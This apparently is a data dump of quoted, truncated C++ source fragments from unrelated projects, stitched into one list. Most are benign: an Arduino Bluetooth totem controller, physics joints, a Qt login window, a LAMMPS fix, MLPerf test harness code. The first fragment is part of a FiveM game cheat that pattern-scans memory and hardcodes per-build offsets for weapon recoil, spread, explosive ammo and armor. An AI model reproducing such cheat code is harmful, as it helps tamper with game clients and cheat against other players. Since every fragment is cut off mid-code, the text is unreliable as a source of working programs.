(bool)Memory::PatternScan(E(\"48 89 5C 24 ?? 55 56 57 48 83 EC 70 65 4C 8B 0C 25\"), NULL, NULL);\r\n\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10A8;\r\n\t\t\tFiveM::Armor = 0x14B8;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10C8;\r\n\t\t\tFiveM::PlayerInfo = 0x10B8;\r\n\t\t\tFiveM::Recoil = 0x2E8;\r\n\t\t\tFiveM::Spread = 0x74;\r\n\t\t\tFiveM::ReloadMultiplier = 0x12C;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5E0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x25C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2060_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2060_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10B8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2545_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2545_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0 + 0x50;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2612_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2612_GTAProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2699_GTAProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2699_GameProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x1530;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2189_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2189_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2372_GamePr",
    "#include <Arduino.h>\n#include <BLEDevice.h>\n#include <string>\n#include \"servos.hpp\"\n#include \"shaders.hpp\"\n\n// UUIDs for BLE service and characteristic, randomly generated hex strings\n#define SERVICE_UUID        \t\t\"4fafc204-1fb5-459e-8fcc-c5c9c331914b\"\n#define CHARACTERISTIC_UUID \t\t\"beb5483f-36e1-4688-b7f5-ea07361b26a8\"\n#define NOTIFY_CHARACTERISTIC_UUID \t\"39f10f91-c4ee-d0fc-6dec-cbc5cfff5a9b\"\n\nextern ShaderManager shaderManager;\nextern ServoManager servoManager;\n\nextern int brightness;\n\nString receivedValue = \"None\";\n\nBLEServer* pServer;\nBLEService* pService;\nBLECharacteristic* pCharacteristic;\nBLECharacteristic* pNotifyCharacteristic;\n\nvoid sendStringToPhone(String cmd, String data) {\n    // Assuming pServer is a global or accessible variable\n    if (!pServer->getConnectedCount()) {\n        Serial.println(\"No devices connected.\");\n        return;\n    }\n\tString s = cmd + \":\" + data;\n\tSerial.println(s);\n    pNotifyCharacteristic->setValue(s.c_str());\n    pNotifyCharacteristic->notify();\n}\n\nclass MyCallbacks : public BLECharacteristicCallbacks {\n\n\tvoid onWrite(BLECharacteristic* pCharacteristic) {\n\t\tstd::string value = pCharacteristic->getValue();\n\n\t\tif (value == \"getShaders\") {\n\t\t\tString shaderNames = \"\";\n\t\t\tfor (const auto& shader : shaderManager.shaders) {\n\t\t\t\tshaderNames += shader.first + \";\"; // Use semicolon as a delimiter\n\t\t\t}\n\t\t\tsendStringToPhone(\"shaders\", shaderNames);  // Send the list when commanded\n\t\t} \n\t\telse if (value == \"getActiveShader\") {\n\t\t\tsendStringToPhone(\"activeShader\", shaderManager.activeShader->getName());\n\t\t}\n\t\telse if (value == \"getAccentShaders\") {\n\t\t\tString shaderNames = \"\";\n\t\t\tfor (const auto& shader : shaderManager.accentShaders) {\n\t\t\t\tshaderNames += shader.first + \";\"; // Use semicolon as a delimiter\n\t\t\t}\n\t\t\tsendStringToPhone(\"accentShaders\", shaderNames);  // Send the list when commanded\n\t\t} \n\t\telse if (value == \"getActiveAccentShader\") {\n\t\t\tsendStringToPhone(\"activeAccentShader\", shaderManager.activeAccentShader->getName());\n\t\t}\n\t\telse if (value == \"getServoSpeeds\") {\n\t\t\tsendStringToPhone(\"servoSpeeds\", servoManager.getServoSpeeds());\n\t\t} \n\t\telse if (value == \"getBrightness\") {\n\t\t\tsendStringToPhone(\"brightness\", String(brightness));\n\t\t}\n\t\telse {\n\n\t\t\tsize_t pos = value.find(':');\n\t\t\tstd::string cmd = value.substr(0, pos);\n\t\t\tstd::string arg = value.substr(pos + 1);\n\n\t\t\treceivedValue = value.c_str();\n\n\t\t\tSerial.println(\"Received Values: \");\n\t\t\tSerial.println(cmd.c_str());\n\t\t\tSerial.println(arg.c_str());\n\n\t\t\tif (cmd == \"setActiveShader\") {\n\t\t\t\tshaderManager.setActiveShader(arg.c_str());\n\t\t\t} \n\t\t\telse if (cmd == \"setActiveAccentShader\") {\n\t\t\t\tshaderManager.setActiveAccentShader(arg.c_str());\n\t\t\t} \n\t\t\telse if (cmd == \"setServoSpeed\") {\n\t\t\t\t// Assume the value is formatted like \"servo1;90\"\n\t\t\t\tint pos = arg.find(\";\");\n\t\t\t\tif (pos != std::string::npos) {\n\t\t\t\t\t// std::string servo = arg.substr(0, pos);\n\t\t\t\t\tint servo = std::stoi(arg.substr(0, pos));\n\t\t\t\t\tfloat speed = std::stof(arg.substr(pos + 1));\n\t\t\t\t\tservoManager.setServoSpeed(servo, speed);\n\t\t\t\t}\n\t\t\t} \n\t\t\telse if (cmd == \"setBrightness\") {\n\t\t\t\t// Assume the value is formatted like \"servo1;90\"\n\t\t\t\tint newBrightness = std::stoi(arg);\n\t\t\t\tbrightness = newBrightness;\n\t\t\t}\n\t\t\telse {\n\t\t\t\tSerial.println(\"Invalid command\");\n\t\t\t}\n\t\t}\n\t}\n};\n\nclass MyServerCallbacks: public BLEServerCallbacks {\n    void onConnect(BLEServer* server) {\n        Serial.println(\"Device connected\");\n    }\n\n    void onDisconnect(BLEServer* server) {\n        Serial.println(\"Device disconnected\");\n        // Start advertising again to allow a new connection\n        BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();\n        pAdvertising->start();\n        Serial.println(\"Advertising started\");\n    }\n};\n\nvoid bluetoothTask(void* args) {\n\t// Initialize BLE, called by setup() in main.cpp\n\tBLEDevice::init(\"Gyroled Totem\");\n\n    pServer = BLEDevice::createServer();\n\tpServer->setCallbacks(new MyServerCallbacks()); // Set the custom callbacks\n\n    pService = pServer->createService(SERVICE_UUID);\n\n    // Characteristic for receiving shader changes\n    pCharacteristic = pService->createCharacteristic(\n        CHARACTERISTIC_UUID,\n        BLECharacteristic::PROPERTY_READ | BLECharacteristic::PROPERTY_WRITE\n    );\n\n    // Characteristic for notifying shader list\n    pNotifyCharacteristic = pService->createCharacteristic(\n        NOTIFY_CHARACTERISTIC_UUID, // A new UUID for the notifying characteristic\n        BLECharacteristic::PROPERTY_NOTIFY\n    );\n\n    pCharacteristic->setCallbacks(new MyCallbacks()); // Set the callback for write operations\n    pCharacteristic->setValue(\"Hello World\");\n    pService->start();\n\n\t// Start advertising\n\tBLEAdvertising* pAdvertising = pServer->getAdvertising();\n\tpAdvertising->addServiceUUID(SERVICE_UUID);\n\tpAdvertising->setScanResponse(true);\n\tpAdvertising->setMinPreferred(0x06);  // Functions that help with faster connections\n\tpAdvertising->setMinPreferred(0x12);\n\tpAdvertising->start();\n\tSerial.println(\"Waiting for a client connectio",
    "/*\r\n * Implementation file for joints.\r\n *\r\n * Part of the Cyclone physics system.\r\n *\r\n * Copyright (c) Icosagon 2003. All Rights Reserved.\r\n *\r\n * This software is distributed under licence. Use of this software\r\n * implies agreement with all terms and conditions of the accompanying\r\n * software licence.\r\n */\r\n\r\n#include <cyclone.h>\r\n\r\nusing namespace cyclone;\r\n\r\nunsigned Joint::addContact(Contact *contact, unsigned limit) const\r\n{\r\n    // Calculate the position of each connection point in world coordinates\r\n    Vector3 a_pos_world = body[0]->getPointInWorldSpace(position[0]);\r\n    Vector3 b_pos_world = body[1]->getPointInWorldSpace(position[1]);\r\n\r\n    // Calculate the length of the joint\r\n    Vector3 a_to_b = b_pos_world - a_pos_world;\r\n    Vector3 normal = a_to_b;\r\n    normal.normalise();\r\n    real length = a_to_b.magnitude();\r\n\r\n    // Check if it is violated\r\n    if (real_abs(length) > error)\r\n    {\r\n        contact->body[0] = body[0];\r\n        contact->body[1] = body[1];\r\n        contact->contactNormal = normal;\r\n        contact->contactPoint = (a_pos_world + b_pos_world) * 0.5f;\r\n        contact->penetration = length-error;\r\n        contact->friction = 1.0f;\r\n        contact->restitution = 0;\r\n        return 1;\r\n    }\r\n\r\n    return 0;\r\n}\r\n\r\nvoid Joint::set(RigidBody *a, const Vector3& a_pos,\r\n                RigidBody *b, const Vector3& b_pos,\r\n                real error)\r\n{\r\n    body[0] = a;\r\n    body[1] = b;\r\n\r\n    position[0] = a_pos;\r\n    position[1] = b_pos;\r\n\r\n    Joint::error = error;\r\n}",
    "/*\nSPDX-FileCopyrightText: 2024 AFCMS <afcm.contact@gmail.com>\nSPDX-License-Identifier: GPL-3.0-or-later\n*/\n\n#include <Arduino.h>\n\n#include \"utils/comm.hpp\"\n#include \"utils/input.hpp\"\n#include \"utils/display/display.hpp\"\n#include \"utils/display/display_progress_bar.hpp\"\n#include \"utils/display/display_sprite_animated.hpp\"\n#include \"utils/display/display_sprite_static.hpp\"\n#include \"utils/display/display_text.hpp\"\n#include \"utils/display/display_text_scrolling.hpp\"\n#include \"utils/time.hpp\"\n\n#include \"screens/screen_connect.hpp\"\n\nusing namespace utils;\n\ninput::Button buttonA(32);\ninput::Button buttonB(33);\n\ndisplay::DisplaySystem displaySystem(10);\n\ntime::TimeSystem timeSystem;\n\ncomm::CommSystem commSystem;\n\ndisplay::Text testText;\n\nvoid setup()\n{\n  Serial.begin(9600);\n  Serial.println(\"DevPet starting...\");\n  commSystem.begin();\n\n  commSystem.log(\"Initializing input system...\");\n\n  buttonA.begin();\n  buttonB.begin();\n\n  commSystem.log(\"Initializing display system...\");\n  displaySystem.begin();\n\n  displaySystem.setNodes2D(screens::connect());\n\n  delay(1000);\n}\n\nvoid loop()\n{\n  // Update time\n  timeSystem.step();\n\n  ///////////\n  // INPUT //\n  ///////////\n\n  if (buttonA.isJustPressed())\n  {\n    commSystem.log(\"Button A pressed\");\n  }\n\n  if (buttonB.isJustPressed())\n  {\n    commSystem.log(\"Button B pressed\");\n  }\n\n  testText.setText(timeSystem.getCurrentHourString());\n  displaySystem.step();\n\n  auto commands = commSystem.step();\n\n  for (int i = 0; i < commands.size(); i++)\n  {\n    auto command = commands.front();\n    commands.pop();\n\n    commSystem.log(comm::MT_INFO, \"Command: \" + command.command_name + \" Payload: \" + command.payload);\n  }\n}\n",
    "#include \"Service.hh\"\n#include <iostream>\n\nusing namespace std;\n\nint main() {\n\tsetlocale(LC_ALL, \"Polish\");\n\n\tstring carMake, carModel, customerName, customerAddress, customerPhone;\n\tint carYear;\n\tdouble partsCost, laborCost;\n\n\tcout << \"Creating new service...\" << endl;\n\tcout << \"Please enter the following information:\" << endl;\n\tcout << \"Enter car make: \";\n\tgetline(cin, carMake);\n\tcout << \"Enter car model: \";\n\tgetline(cin, carModel);\n\tcout << \"Enter car year: \";\n\tcin >> carYear;\n\tcin.ignore(); // Ignore the newline character left by previous input\n\tcout << \"Enter customer name: \";\n\tgetline(cin, customerName);\n\tcout << \"Enter customer address: \";\n\tgetline(cin, customerAddress);\n\tcout << \"Enter customer phone: \";\n\tgetline(cin, customerPhone);\n\tcout << \"Enter parts cost: \";\n\tcin >> partsCost;\n\tcout << \"Enter labor cost: \";\n\tcin >> laborCost;\n\n\tcout << endl << endl << \"Generating new service...\" << endl\n\t\t<< \"Creating new car...\" << endl;\n\tCar car(carMake, carModel, carYear);\n\n\tcout << \"Car created...\" << endl\n\t\t<< \"Creating new customer...\" << endl;\n\tCustomer customer(customerName, customerAddress, customerPhone);\n\n\tcout << \"Customer created...\" << endl\n\t\t<< \"Creating new service quote...\" << endl;\n\n\tServiceQuote serviceQuote(partsCost, laborCost);\n\tcout << \"Service quote created...\" << endl;\n\n\tService service(car, customer, serviceQuote);\n\tcout << \"Service created...\" << endl;\n\n\tcout << \"Service cost: \" << service.getCost() << endl;\n\n\tcout << endl << endl << endl << \"Press enter to exit...\";\n\treturn !!!getchar();\n}",
    "#include <gtest/gtest.h>\n#include \"clopts.hpp\"\n#include <sstream>\n#include <regex>\n#include <initializer_list>\n\nnamespace{\n\nusing namespace moss;\n\n/** Test for options, which terminate the interpreter (-h/-version) */\nTEST(CmdOptions, Terminating){\n    // help\n    const char* argv[] = {\n        \"moss\", \"-h\"\n    };\n    int argc = sizeof(argv) / sizeof(argv[0]);\n\n    EXPECT_EXIT(clopts::parse_clopts(argc, argv), ::testing::ExitedWithCode(0), \"\");\n    \n    // version\n    const char* argv2[] = {\n        \"moss\", \"--version\"\n    };\n    int argc2 = sizeof(argv2) / sizeof(argv2[0]);\n\n    EXPECT_EXIT(clopts::parse_clopts(argc2, argv2), ::testing::ExitedWithCode(0), \"\");\n\n    // file followed by program argument\n    const char* argv3[] = {\n        \"moss\", \"--nonexistentflag42\", \"and one more\"\n    };\n    int argc3 = sizeof(argv3) / sizeof(argv3[0]);\n\n    // Test that we dont exit with other code that 0, force 0 after no exit\n    EXPECT_EXIT(clopts::parse_clopts(argc3, argv3), testing::ExitedWithCode(1), \".*Flag could not be matched.*\");\n}\n\n/** Correct command line options, that should not terminate the program */\nTEST(CmdOptions, NonTerminating) {\n    // file followed by program argument\n    const char* argv[] = {\n        \"moss\", \"program.ms\", \"--nonexistentflag42\", \"and one more\"\n    };\n    int argc = sizeof(argv) / sizeof(argv[0]);\n\n    // Test that we dont exit with other code that 0, force 0 after no exit\n    ASSERT_EXIT( { clopts::parse_clopts(argc, argv); exit(0); },\n            testing::ExitedWithCode(0),\n            \"\");\n\n    clopts::parse_clopts(argc, argv);\n    EXPECT_TRUE(args::get(clopts::file_name) == ustring(\"program.ms\"));\n    EXPECT_FALSE(clopts::code);\n\n    // code string followed by program argument\n    const char* argv1[] = {\n        \"moss\", \"-e\", \"print(\\\"hi\\\");\", \"--nonexistentflag42\", \"and one more\"\n    };\n    int argc1 = sizeof(argv1) / sizeof(argv1[0]);\n\n    // Test that we dont exit with other code that 0, force 0 after no exit\n    EXPECT_EXIT( { clopts::parse_clopts(argc1, argv1); exit(0); },\n            testing::ExitedWithCode(0),\n            \"\");\n\n    clopts::parse_clopts(argc1, argv1);\n    EXPECT_TRUE(clopts::code);\n    EXPECT_FALSE(clopts::file_name);\n}\n\n}",
    "#include \"loginwindow.h\"\n#include \"ui_loginwindow.h\"\n#include \"registerwindow.h\"\n#include \"user.h\"\n#include \"allusers.h\"\n#include <main.cpp>\n#include <QPixmap>\n#include <QPalette>\n#include <QString>\n\nLoginWindow::LoginWindow(QWidget *parent) : QDialog(parent), ui(new Ui::LoginWindow){\n    ui->setupUi(this);\n\n    qDebug()<<QSqlDatabase::drivers();\n\n    ui->usernameError->setVisible(false);\n    ui->usernameError->setStyleSheet(\"QLabel { color : red; }\");\n\n    ui->passError->setVisible(false);\n    ui->passError->setStyleSheet(\"QLabel { color : red; }\");\n\n    ui->usernameLabel->setStyleSheet(\"QLabel { color : white; }\");\n    ui->passLabel->setStyleSheet(\"QLabel { color : white; }\");\n\n    QPixmap background(\":/image/img/LoginWindow.png\");\n    background = background.scaled(this->size(), Qt::KeepAspectRatio);\n\n    QPalette palette;\n    palette.setBrush(QPalette::Window, background);\n    this->setPalette(palette);\n\n}\n\nLoginWindow::~LoginWindow(){\n    delete ui;\n}\n\nvoid LoginWindow::on_loginPush_clicked(){\n    QString username = ui->username_line->text();\n    QString password = ui->pass_line->text();\n    loggedUser = AllUsers::authenticateUser(username, password); //check user with db\n    if (loggedUser){\n        // show level\n        WindowManager window;\n        window.showWindow(WindowManager::lev, 0, loggedUser);\n        hide();\n    }else{\n        // show errors\n        ui->usernameError->setVisible(true);\n        ui->passError->setVisible(true);\n    }\n}\n\n\nvoid LoginWindow::on_registerPush_clicked(){\n    // show reg window\n    WindowManager Manager;\n    Manager.showWindow(WindowManager::reg);\n    hide();\n}\n\n",
    "/* ----------------------------------------------------------------------\n   LAMMPS - Large-scale Atomic/Molecular Massively Parallel Simulator\n   http://lammps.sandia.gov, Sandia National Laboratories\n   Steve Plimpton, sjplimp@sandia.gov\n\n   Copyright (2003) Sandia Corporation.  Under the terms of Contract\n   DE-AC04-94AL85000 with Sandia Corporation, the U.S. Government retains\n   certain rights in this software.  This software is distributed under\n   the GNU General Public License.\n\n   See the README file in the top-level LAMMPS directory.\n\n   Modified by Olav Galteland, olav.galteland@ntnu.no\n   Reflective particle method: 10.1103/PhysRevE.57.7259\n------------------------------------------------------------------------- */\n\n#include <stdlib.h>\n#include <string.h>\n#include \"fix_wall_rpm.h\"\n#include \"atom.h\"\n#include \"comm.h\"\n#include \"update.h\"\n#include \"modify.h\"\n#include \"domain.h\"\n#include \"lattice.h\"\n#include \"input.h\"\n#include \"variable.h\"\n#include \"error.h\"\n#include \"force.h\"\n\nusing namespace LAMMPS_NS;\nusing namespace FixConst;\n\nenum{XLO=0,XHI=1,YLO=2,YHI=3,ZLO=4,ZHI=5};\nenum{NONE=0,EDGE,CONSTANT,VARIABLE};\n\n/* ---------------------------------------------------------------------- */\n\nFixWallRPM::FixWallRPM(LAMMPS *lmp, int narg, char **arg) :\n  Fix(lmp, narg, arg),\n  nwall(0),\n  rng(lmp, 987334)\n{\n  if (narg < 4) error->all(FLERR,\"Illegal fix wall/rpm command\");\n\n  // parse args\n\n  nwall = 0;\n  int scaleflag = 1;\n  //p = atof(arg[3]);\n\n  int iarg = 3;\n  while (iarg < narg) {\n    if ((strcmp(arg[iarg],\"xlo\") == 0) || (strcmp(arg[iarg],\"xhi\") == 0) ||\n        (strcmp(arg[iarg],\"ylo\") == 0) || (strcmp(arg[iarg],\"yhi\") == 0) ||\n        (strcmp(arg[iarg],\"zlo\") == 0) || (strcmp(arg[iarg],\"zhi\") == 0)) {\n      if (iarg+3 > narg) error->all(FLERR,\"Illegal fix wall/rpm command\");\n\n      int newwall;\n      if (strcmp(arg[iarg],\"xlo\") == 0) newwall = XLO;\n      else if (strcmp(arg[iarg],\"xhi\") == 0) newwall = XHI;\n      else if (strcmp(arg[iarg],\"ylo\") == 0) newwall = YLO;\n      else if (strcmp(arg[iarg],\"yhi\") == 0) newwall = YHI;\n      else if (strcmp(arg[iarg],\"zlo\") == 0) newwall = ZLO;\n      else if (strcmp(arg[iarg],\"zhi\") == 0) newwall = ZHI;\n\n      for (int m = 0; (m < nwall) && (m < 6); m++)\n        if (newwall == wallwhich[m])\n          error->all(FLERR,\"Wall defined twice in fix wall/rpm command\");\n\n      wallwhich[nwall] = newwall;\n      if (strcmp(arg[iarg+1],\"EDGE\") == 0) {\n        wallstyle[nwall] = EDGE;\n        int dim = wallwhich[nwall] / 2;\n        int side = wallwhich[nwall] % 2;\n        if (side == 0) coord0[nwall] = domain->boxlo[dim];\n        else coord0[nwall] = domain->boxhi[dim];\n      } else if (strstr(arg[iarg+1],\"v_\") == arg[iarg+1]) {\n        wallstyle[nwall] = VARIABLE;\n        int n = strlen(&arg[iarg+1][2]) + 1;\n        varstr[nwall] = new char[n];\n        strcpy(varstr[nwall],&arg[iarg+1][2]);\n      } else {\n        wallstyle[nwall] = CONSTANT;\n        coord0[nwall] = utils::numeric(FLERR,arg[iarg+1],false,lmp);\n      }\n        \n      // Only allow for one p TODO: One p for each wall\n      p = atof(arg[iarg+2]);\n      nwall++;\n      iarg += 3;\n\n    } else if (strcmp(arg[iarg],\"units\") == 0) {\n      if (iarg+2 > narg) error->all(FLERR,\"Illegal wall/rpm command\");\n      if (strcmp(arg[iarg+1],\"box\") == 0) scaleflag = 0;\n      else if (strcmp(arg[iarg+1],\"lattice\") == 0) scaleflag = 1;\n      else error->all(FLERR,\"Illegal fix wall/rpm command\");\n      iarg += 2;\n    } else error->all(FLERR,\"Illegal fix wall/rpm command\");\n  }\n\n  // error check\n\n  if (nwall == 0) error->all(FLERR,\"Illegal fix wall command\");\n    \n  // Why not?\n  /*\n  for (int m = 0; m < nwall; m++) {\n    if ((wallwhich[m] == XLO || wallwhich[m] == XHI) && domain->xperiodic)\n      error->all(FLERR,\"Cannot use fix wall/rpm in periodic dimension\");\n    if ((wallwhich[m] == YLO || wallwhich[m] == YHI) && domain->yperiodic)\n      error->all(FLERR,\"Cannot use fix wall/rpm in periodic dimension\");\n    if ((wallwhich[m] == ZLO || wallwhich[m] == ZHI) && domain->zperiodic)\n      error->all(FLERR,\"Cannot use fix wall/rpm in periodic dimension\");\n  }\n  */\n\n  for (int m = 0; m < nwall; m++)\n    if ((wallwhich[m] == ZLO || wallwhich[m] == ZHI) && domain->dimension == 2)\n      error->all(FLERR,\n                 \"Cannot use fix wall/rpm zlo/zhi for a 2d simulation\");\n\n  // scale factors for CONSTANT and VARIABLE walls\n\n  int flag = 0;\n  for (int m = 0; m < nwall; m++)\n    if (wallstyle[m] != EDGE) flag = 1;\n\n  if (flag) {\n    if (scaleflag) {\n      xscale = domain->lattice->xlattice;\n      yscale = domain->lattice->ylattice;\n      zscale = domain->lattice->zlattice;\n    }\n    else xscale = yscale = zscale = 1.0;\n\n    for (int m = 0; m < nwall; m++) {\n      if (wallstyle[m] != CONSTANT) continue;\n      if (wallwhich[m] < YLO) coord0[m] *= xscale;\n      else if (wallwhich[m] < ZLO) coord0[m] *= yscale;\n      else coord0[m] *= zscale;\n    }\n  }\n\n  // set varflag if any wall positions are variable\n\n  varflag = 0;\n  for (int m =",
    "/*\n * Copyright (c) 2020, NVIDIA CORPORATION.  All rights reserved.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *     http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n#include <cassert>\n#include <condition_variable>\n#include <deque>\n#include <iostream>\n#include <map>\n#include <mutex>\n#include <thread>\n#include <vector>\n\n#include \"loadgen.h\"\n#include \"query_sample_library.h\"\n#include \"system_under_test.h\"\n#include \"test_settings.h\"\n\nclass QSL : public mlperf::QuerySampleLibrary {\n public:\n  ~QSL() override{};\n  const std::string& Name() override { return mName; }\n  size_t TotalSampleCount() override { return 1000000; }\n  size_t PerformanceSampleCount() override { return TotalSampleCount(); }\n  void LoadSamplesToRam(\n      const std::vector<mlperf::QuerySampleIndex>& samples) override {}\n  void UnloadSamplesFromRam(\n      const std::vector<mlperf::QuerySampleIndex>& samples) override {}\n\n private:\n  std::string mName{\"Dummy QSL\"};\n};\n\nclass BasicSUT : public mlperf::SystemUnderTest {\n public:\n  BasicSUT() {\n    // Start with some large value so that we don't reallocate memory.\n    initResponse(10000);\n  }\n  ~BasicSUT() override {}\n  const std::string& Name() override { return mName; }\n  void IssueQuery(const std::vector<mlperf::QuerySample>& samples) override {\n    int n = samples.size();\n    if (n > mResponses.size()) {\n      std::cerr << \"Warning: reallocating response buffer in BasicSUT. Maybe \"\n                   \"you should initResponse with larger value!?\"\n                << std::endl;\n      initResponse(samples.size());\n    }\n    for (int i = 0; i < n; i++) {\n      mResponses[i].id = samples[i].id;\n    }\n    mlperf::QuerySamplesComplete(mResponses.data(), n);\n  }\n  void FlushQueries() override {}\n\n private:\n  void initResponse(int size) {\n    mResponses.resize(size,\n                      {0, reinterpret_cast<uintptr_t>(&mBuf), sizeof(int)});\n  }\n  int mBuf{0};\n  std::string mName{\"BasicSUT\"};\n  std::vector<mlperf::QuerySampleResponse> mResponses;\n};\n\nclass QueueSUT : public mlperf::SystemUnderTest {\n public:\n  QueueSUT(int numCompleteThreads, int maxSize) {\n    // Each thread handle at most maxSize at a time.\n    std::cout << \"QueueSUT: maxSize = \" << maxSize << std::endl;\n    initResponse(numCompleteThreads, maxSize);\n    // Launch complete threads\n    for (int i = 0; i < numCompleteThreads; i++) {\n      mThreads.emplace_back(&QueueSUT::CompleteThread, this, i);\n    }\n  }\n  ~QueueSUT() override {\n    {\n      std::unique_lock<std::mutex> lck(mMtx);\n      mDone = true;\n      mCondVar.notify_all();\n    }\n    for (auto& thread : mThreads) {\n      thread.join();\n    }\n  }\n  const std::string& Name() override { return mName; }\n  void IssueQuery(const std::vector<mlperf::QuerySample>& samples) override {\n    std::unique_lock<std::mutex> lck(mMtx);\n    for (const auto& sample : samples) {\n      mIdQueue.push_back(sample.id);\n    }\n    // Let some worker thread to consume tasks\n    mCondVar.notify_one();\n  }\n  void FlushQueries() override {}\n\n private:\n  void CompleteThread(int threadIdx) {\n    auto& responses = mResponses[threadIdx];\n    size_t maxSize{responses.size()};\n    size_t actualSize{0};\n    while (true) {\n      {\n        std::unique_lock<std::mutex> lck(mMtx);\n        mCondVar.wait(lck, [&]() { return !mIdQueue.empty() || mDone; });\n\n        if (mDone) {\n          break;\n        }\n\n        actualSize = std::min(maxSize, mIdQueue.size());\n        for (int i = 0; i < actualSize; i++) {\n          responses[i].id = mIdQueue.front();\n          mIdQueue.pop_front();\n        }\n        mCondVar.notify_one();\n      }\n      mlperf::QuerySamplesComplete(responses.data(), actualSize);\n    }\n  }\n  void initResponse(int numCompleteThreads, int size) {\n    mResponses.resize(numCompleteThreads);\n    for (auto& responses : mResponses) {\n      responses.resize(size,\n                       {0, reinterpret_cast<uintptr_t>(&mBuf), sizeof(int)});\n    }\n  }\n  int mBuf{0};\n  std::string mName{\"QueueSUT\"};\n  std::vector<std::vector<mlperf::QuerySampleResponse>> mResponses;\n  std::vector<std::thread> mThreads;\n  std::deque<mlperf::ResponseId> mIdQueue;\n  std::mutex mMtx;\n  std::condition_variable mCondVar;\n  bool mDone{false};\n};\n\nclass MultiBasicSUT : public mlperf::SystemUnderTest {\n public:\n  MultiBasicSUT(int numThreads)\n      : mNumThreads(numThreads), mResponses(numThreads) {\n    // Start with some large value so that we don't reallocate memory.\n    initResponse(10000);\n    for (int i = 0; i < mNumThreads; ++i) {\n      mThreads.emplace_back(&MultiBasicSUT::startIss",
